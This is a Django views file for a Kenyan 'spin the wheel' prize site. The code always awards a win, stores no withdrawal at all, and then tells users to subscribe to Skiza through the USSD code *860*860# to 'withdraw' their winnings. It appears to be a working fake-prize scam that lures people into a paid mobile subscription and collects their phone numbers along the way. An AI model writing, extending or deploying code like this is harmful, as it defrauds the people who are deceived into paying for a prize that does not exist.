from django.shortcuts import render, redirect
from django.http import JsonResponse
from django.views.decorators.http import require_http_methods, require_POST
from django.views.decorators.csrf import csrf_exempt
from django.urls import reverse
from .models import WithdrawalRequest
from .forms import WithdrawalRequestForm
from .services.spin_logic import SpinService
import json


def loading_animation(request):
    """
    Display loading animation page (first page users see).
    Auto-redirects to landing page after 2 seconds.
    """
    return render(request, 'spin/loading.html')


def landing_page(request):
    """
    Main landing page with the spin wheel.
    Users can spin once per session.
    """
    # Check if user has already spun in this session
    has_spun = request.session.get('has_spun', False)
    amount_won = request.session.get('amount_won', None)
    
    context = {
        'has_spun': has_spun,
        'amount_won': amount_won,
    }
    return render(request, 'spin/landing.html', context)


@require_POST
def spin_wheel(request):
    """
    AJAX endpoint for spinning the wheel.
    Always returns winning amount from service.
    """
    # Check if user has already spun - REMOVED for unlimited spins
    # Logic removed to allow unlimited spins

    
    # Get winning amount from service
    winning_amount = SpinService.get_winning_amount()
    
    # Store in session
    request.session['has_spun'] = True
    request.session['amount_won'] = winning_amount
    
    return JsonResponse({
        'success': True,
        'amount': winning_amount,
        'message': f'Congratulations! You won Kshs {winning_amount}!'
    })


def withdrawal_request(request):
    """
    Display withdrawal request form page.
    Shows the amount won and collects phone number.
    """
    # Check if user has spun the wheel
    if not request.session.get('has_spun', False):
        return redirect('landing_page')
    
    amount_won = request.session.get('amount_won', 800)
    form = WithdrawalRequestForm()
    
    context = {
        'form': form,
        'amount_won': amount_won,
    }
    return render(request, 'spin/withdrawal.html', context)


@require_POST
def submit_withdrawal(request):
    """
    AJAX endpoint for submitting withdrawal request.
    Validates phone number and creates withdrawal record.
    """
    try:
        # Get data from request
        data = json.loads(request.body)
        phone_number = data.get('phone_number', '').strip()
        
        # Check if user has spun
        if not request.session.get('has_spun', False):
            return JsonResponse({
                'success': False,
                'error': 'Please spin the wheel first.'
            }, status=400)
        
        # Get amount won from session
        amount_won = request.session.get('amount_won', 800)
        
        # Create form instance for validation
        form = WithdrawalRequestForm(data={'phone_number': phone_number})
        
        if form.is_valid():
            # NO DATABASE SAVE REQUIRED
            # Ideally we would send an SMS here, but for this flow we just return success
            
            # withdrawal = WithdrawalRequest.objects.create(...)  <-- Removed
            
            # Store dummy withdrawal ID in session to allow access to next page if needed
            request.session['withdrawal_id'] = 'dummy_id'
            
            return JsonResponse({
                'success': True,
                'ussd_code': '*860*860#',
                'message': 'Withdrawal request submitted successfully',
                'redirect_url': reverse('subscription_instructions')
            })
        else:
            # Return validation errors
            errors = []
            for field, error_list in form.errors.items():
                for error in error_list:
                    errors.append(error)
            
            return JsonResponse({
                'success': False,
                'error': ' '.join(errors)
            }, status=400)
            
    except json.JSONDecodeError:
        return JsonResponse({
            'success': False,
            'error': 'Invalid request data.'
        }, status=400)
    except Exception as e:
        return JsonResponse({
            'success': False,
            'error': 'An error occurred. Please try again.'
        }, status=500)


def subscription_instructions(request):
    """
    Display Skiza subscription instructions with USSD code.
    Shows how to subscribe to withdraw winnings.
    """
    # Check if withdrawal request exists
    if not request.session.get('withdrawal_id'):
        return redirect('withdrawal_request')
    
    amount_won = request.session.get('amount_won', 800)
    
    context = {
        'amount_won': amount_won,
        'ussd_code': '*860*860#',
    }
    return render(request, 'spin/subscription.html', context)


def processing_confirmation(request):
    """
    Display processing confirmation page.
    Shows that withdrawal request is being processed.
    """
    # Check if withdrawal request exists
    withdrawal_id = request.session.get('withdrawal_id')
    if not withdrawal_id:
        return redirect('landing_page')
    
    try:
        withdrawal = WithdrawalRequest.objects.get(id=withdrawal_id)
        # Update status to processing
        withdrawal.status = 'processing'
        withdrawal.save()
    except WithdrawalRequest.DoesNotExist:
        pass
    
    amount_won = request.session.get('amount_won', 800)
    
    # Clear session data (allow new spins)
    request.session.flush()
    
    context = {
        'amount_won': amount_won,
    }
    return render(request, 'spin/confirmation.html', context)


def how_it_works(request):
    """
    Display 'How It Works' information page.
    """
    return render(request, 'spin/how_it_works.html')


def terms_and_conditions(request):
    """
    Display Terms & Conditions page.
    """
    return render(request, 'spin/terms.html')


def privacy_policy(request):
    """
    Display Privacy Policy page.
    """
    return render(request, 'spin/privacy.html')
